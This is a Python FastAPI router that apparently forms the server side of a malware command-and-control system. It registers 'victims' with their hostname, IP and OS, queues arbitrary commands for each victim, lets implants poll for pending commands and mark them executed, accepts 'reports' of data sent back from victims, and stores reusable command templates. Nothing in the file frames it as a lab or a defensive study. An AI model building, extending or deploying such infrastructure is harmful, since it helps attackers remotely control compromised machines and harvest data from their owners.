from fastapi import APIRouter, Depends, HTTPException
from sqlalchemy.orm import Session
from database import get_db, Victim, Command, Report, SavedCommand
from pydantic import BaseModel
from typing import List, Optional
from datetime import datetime

router = APIRouter()

# === Victim Pydantic Models ===

class VictimInput(BaseModel):
    victim_id: str
    hostname: Optional[str]
    ip_address: Optional[str]
    os_info: Optional[str]

class CommandInput(BaseModel):
    command: str

class ReportInput(BaseModel):
    data: str

class VictimOut(BaseModel):
    victim_id: str
    hostname: Optional[str]
    ip_address: Optional[str]
    os_info: Optional[str]
    last_seen: datetime

    class Config:
        orm_mode = True

# === Victim Routes ===

@router.post("/victims/status")
def update_status(data: VictimInput, db: Session = Depends(get_db)):
    victim = db.query(Victim).filter_by(victim_id=data.victim_id).first()
    if victim:
        victim.hostname = data.hostname
        victim.ip_address = data.ip_address
        victim.os_info = data.os_info
        victim.last_seen = datetime.utcnow()
    else:
        victim = Victim(**data.dict(), last_seen=datetime.utcnow())
        db.add(victim)
    db.commit()
    return {"message": "Status updated"}

@router.get("/victims", response_model=List[VictimOut])
def get_all_victims(db: Session = Depends(get_db)):
    return db.query(Victim).all()

@router.get("/victims/{victim_id}/commands")
def get_pending_commands(victim_id: str, db: Session = Depends(get_db)):
    victim = db.query(Victim).filter_by(victim_id=victim_id).first()
    if not victim:
        raise HTTPException(status_code=404, detail="Victim not found")
    cmds = db.query(Command).filter_by(victim_id=victim.id, executed=False).all()
    return [{"id": c.id, "command": c.command} for c in cmds]

@router.post("/victims/{victim_id}/commands")
def add_command(victim_id: str, cmd: CommandInput, db: Session = Depends(get_db)):
    victim = db.query(Victim).filter_by(victim_id=victim_id).first()
    if not victim:
        raise HTTPException(status_code=404, detail="Victim not found")
    command = Command(victim_id=victim.id, command=cmd.command)
    db.add(command)
    db.commit()
    return {"message": "Command added"}

@router.post("/victims/{victim_id}/commands/{command_id}/mark-executed")
def mark_command_executed(victim_id: str, command_id: int, db: Session = Depends(get_db)):
    victim = db.query(Victim).filter_by(victim_id=victim_id).first()
    command = db.query(Command).filter_by(id=command_id, victim_id=victim.id).first()
    if command:
        command.executed = True
        db.commit()
        return {"message": "Command marked executed"}
    raise HTTPException(status_code=404, detail="Command not found")

@router.post("/victims/{victim_id}/report")
def submit_report(victim_id: str, report: ReportInput, db: Session = Depends(get_db)):
    victim = db.query(Victim).filter_by(victim_id=victim_id).first()
    if not victim:
        raise HTTPException(status_code=404, detail="Victim not found")
    db.add(Report(victim_id=victim.id, data=report.data))
    db.commit()
    return {"message": "Report saved"}

# === Saved Command Pydantic Models ===

class SavedCommandInput(BaseModel):
    name: str
    value: str

class SavedCommandOut(BaseModel):
    id: int
    name: str
    value: str

    class Config:
        orm_mode = True

# === Saved Command Routes ===

@router.get("/saved-commands", response_model=List[SavedCommandOut])
def list_saved_commands(db: Session = Depends(get_db)):
    return db.query(SavedCommand).all()

@router.post("/saved-commands", response_model=SavedCommandOut)
def create_saved_command(cmd: SavedCommandInput, db: Session = Depends(get_db)):
    existing = db.query(SavedCommand).filter_by(name=cmd.name).first()
    if existing:
        raise HTTPException(status_code=400, detail="Command name already exists")
    sc = SavedCommand(name=cmd.name, value=cmd.value)
    db.add(sc)
    db.commit()
    db.refresh(sc)
    return sc

@router.delete("/saved-commands/{cmd_id}")
def delete_saved_command(cmd_id: int, db: Session = Depends(get_db)):
    sc = db.query(SavedCommand).filter_by(id=cmd_id).first()
    if not sc:
        raise HTTPException(status_code=404, detail="Command not found")
    db.delete(sc)
    db.commit()
    return {"message": "Deleted"}
